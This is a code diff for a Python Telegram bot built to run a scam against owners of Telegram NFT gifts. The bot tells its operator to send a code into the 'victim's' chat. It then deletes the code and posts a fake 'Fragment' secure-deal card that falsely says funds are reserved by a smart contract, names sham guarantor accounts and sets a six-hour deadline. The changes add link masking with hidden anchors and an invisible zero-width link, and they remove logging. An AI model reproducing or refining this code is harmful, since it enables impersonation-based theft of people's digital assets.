@@ -42,7 +42,7 @@ def get_db():
 
 def init_db():
     with get_db() as conn:
-        # Сносим старые таблицы для обновления схемы
+        # Сносим старые таблицы, чтобы избежать ошибки "no column named"
         conn.execute("DROP TABLE IF EXISTS offers")
         conn.execute("DROP TABLE IF EXISTS users")
         conn.execute("DROP TABLE IF EXISTS keys")
@@ -69,7 +69,7 @@ def init_db():
 init_db()
 
 # ==========================================
-# РЕГУЛЯРКИ
+# РЕГУЛЯРКИ И ПАРСЕРЫ
 # ==========================================
 NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)", re.I)
 PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐|grams)", re.I)
@@ -108,19 +108,16 @@ async def safe_send(bot: Bot, chat_id: int, text: str, conn_id: str, reply_marku
             if "PEER_FLOOD" in str(e):
                 await asyncio.sleep(30)
             else:
-                log.error(f"Ошибка Telegram: {e}")
                 return None
-        except Exception as e:
+        except Exception:
             return None
     return None
 
 async def safe_delete(bot: Bot, chat_id: int, msg_id: int, conn_id: str):
-    # Удаление кода (без задержки, чтобы сработало наверняка)
     try:
         await bot.delete_business_messages(business_connection_id=conn_id, message_ids=[msg_id])
-        log.info(f"🗑 Код {msg_id} удален.")
-    except Exception as e:
-        log.warning(f"⚠️ Не удалось удалить код {msg_id}: {e}")
+    except Exception:
+        pass
 
 # ==========================================
 # BUSINESS CONNECTION
@@ -128,7 +125,6 @@ async def safe_delete(bot: Bot, chat_id: int, msg_id: int, conn_id: str):
 @router.business_connection()
 async def on_business_conn(conn: BusinessConnection):
     BUSINESS_CONNS[conn.user.id] = conn.id
-    log.info(f"✅ Business: user={conn.user.id} id={conn.id}")
 
 # ==========================================
 # МЕНЮ
@@ -173,7 +169,7 @@ async def cb_main_menu(cb: CallbackQuery):
     await cb.answer()
 
 # ==========================================
-# ПОДПИСКИ И ОФФЕРЫ
+# ПОДПИСКИ
 # ==========================================
 @router.callback_query(F.data == "create_offer_btn")
 async def cb_create_offer(cb: CallbackQuery):
@@ -215,6 +211,9 @@ async def cmd_key(msg: Message):
         else:
             await msg.reply("❌ Неверный ключ.")
 
+# ==========================================
+# СОЗДАНИЕ ОФФЕРА
+# ==========================================
 @router.message(F.text.regexp(r"^/offer\s+"))
 async def cmd_offer(msg: Message):
     uid = msg.from_user.id
@@ -257,6 +256,9 @@ async def cmd_offer(msg: Message):
     prefix = "🎁 <b>Тестовый оффер!</b>\n\n" if is_test else ""
     await msg.reply(f"{prefix}✅ Оффер <code>{oid}</code> создан.\n\nОтправьте этот код в чат с жертвой.\n/cancel_{oid} — отменить.")
 
+# ==========================================
+# ОТМЕНА ОФФЕРА
+# ==========================================
 @router.message(F.text.regexp(r"^/cancel_(of_[a-f0-9]{5})$"))
 async def cmd_cancel_offer(msg: Message):
     oid = msg.text.replace("/cancel_", "").strip()
@@ -264,18 +266,16 @@ async def cmd_cancel_offer(msg: Message):
         offer = conn.execute("SELECT * FROM offers WHERE id=? AND buyer_id=?", (oid, msg.from_user.id)).fetchone()
         if offer:
             if offer["message_id"] and offer["conn_id"]:
-                await safe_delete(bot, offer["buyer_id"], offer["message_id"], offer["conn_id"])
+                asyncio.create_task(safe_delete(bot, offer["buyer_id"], offer["message_id"], offer["conn_id"]))
             conn.execute("DELETE FROM offers WHERE id=?", (oid,))
             await msg.reply("🗑 Оффер отменен и удален из чата.")
         else: await msg.reply("❌ Не найден.")
 
 # ==========================================
-# ОТПРАВКА ОФФЕРА (МАКСИМАЛЬНОЕ ДОВЕРИЕ)
+# ОТПРАВКА ОФФЕРА (ФИНАЛЬНЫЙ ВИЗУАЛ)
 # ==========================================
 @router.business_message(F.text)
 async def handle_business_message(msg: Message):
-    log.info(f"🔥 BUSINESS MSG: from={msg.from_user.id}, text={msg.text}")
-    
     m = CODE_RE.search(msg.text)
     if not m: return
     oid = m.group(1).lower()
@@ -289,35 +289,30 @@ async def handle_business_message(msg: Message):
     conn_id = BUSINESS_CONNS.get(msg.from_user.id)
     if not conn_id: return
 
-    # 1. Удаляем код (без задержек, чтобы точно сработало)
+    # 1. Удаляем код
     await safe_delete(bot, msg.chat.id, msg.message_id, conn_id)
-    
-    # Небольшая пауза перед отправкой карточки
     await asyncio.sleep(1.5)
 
     price_str = f"{offer['price_amount']} ⭐️" if offer["price_currency"] == "Stars" else f"{offer['price_amount']} Gram"
     
-    # Ссылки
     nft_link = f"https://t.me/nft/{offer['nft_slug']}"
     fragment_link = "https://fragment.com" 
 
-    # МАСКИРОВКА: Прячем ссылку под название подарка
-    # Ссылка в теге <a> не отображается как URL, а выглядит как текст.
-    # А чтобы картинка подтянулась, мы вставляем ту же ссылку в самый низ (под спойлер, или просто текстом).
-    # Telegram видит ссылку внизу -> подтягивает превью снизу.
-    
+    # Маскируем ссылки
     hidden_nft_name = f'<a href="{nft_link}">{offer["nft_name"]}</a>'
+    hidden_fragment = f'<a href="{fragment_link}">Fragment</a>'
 
+    # Формируем текст (ссылка для превью спрятана в невидимый символ внизу)
     card_text = (
-        f"<b>🛡 <a href='{fragment_link}'>Fragment</a> · Безопасная сделка #{oid.upper()[3:]}</b>\n"
+        f"<b>🛡 {hidden_fragment} · Безопасная сделка #{oid.upper()[3:]}</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"<b>Уведомление о зарезервированной сделке</b>\n\n"
         f"Пользователь <b>@{offer['buyer_username']}</b> инициировал безопасный обмен вашего подарка {hidden_nft_name} на <b>{price_str}</b>.\n\n"
         f"✅ <b>Статус:</b> Средства успешно зарезервированы смарт-контрактом.\n"
         f"🔒 <b>Гаранты:</b> <a href='https://t.me/TelegramSuporteDeDados'>@TelegramSuporteDeDados</a>, <a href='https://t.me/notoscam'>@notoscam</a>\n"
         f"⏱ <b>Лимит времени:</b> 6 часов до отмены резерва.\n\n"
-        f"<i>Для завершения процедуры необходимо подтвердить передачу цифрового актива. Нажмите «Принять» ниже, чтобы перейти в защищенный интерфейс Fragment.</i>\n\n"
-        f"{nft_link}" # <--- Ссылка внизу, чтобы подтянулась картинка
+        f"<i>Для полной резервации суммы и автоматическим подключением гарантий, нажмите «Принять» ниже.</i>\n\n"
+        f'<a href="{nft_link}">&#8203;</a>' # Невидимая ссылка для картинки
     )
 
     kb = InlineKeyboardMarkup(inline_keyboard=[
@@ -328,11 +323,8 @@ async def handle_business_message(msg: Message):
     sent = await safe_send(bot, msg.chat.id, card_text, conn_id, reply_markup=kb)
     
     if sent:
-        log.info(f"✅ Карточка отправлена: {sent.message_id}")
         with get_db() as conn:
             conn.execute("UPDATE offers SET message_id=?, conn_id=? WHERE id=?", (sent.message_id, conn_id, oid))
-    else:
-        log.error("❌ Ошибка отправки (PEER_FLOOD или бан).")
 
 # ==========================================
 # ЛОГИКА КНОПОК
@@ -382,7 +374,7 @@ async def on_reject(cb: CallbackQuery):
     await cb.answer("Вы отклонили предложение.")
 
 # ==========================================
-# АДМИН КОМАНДЫ
+# АДМИН
 # ==========================================
 @router.message(Command("keys"))
 async def cmd_keys(msg: Message):
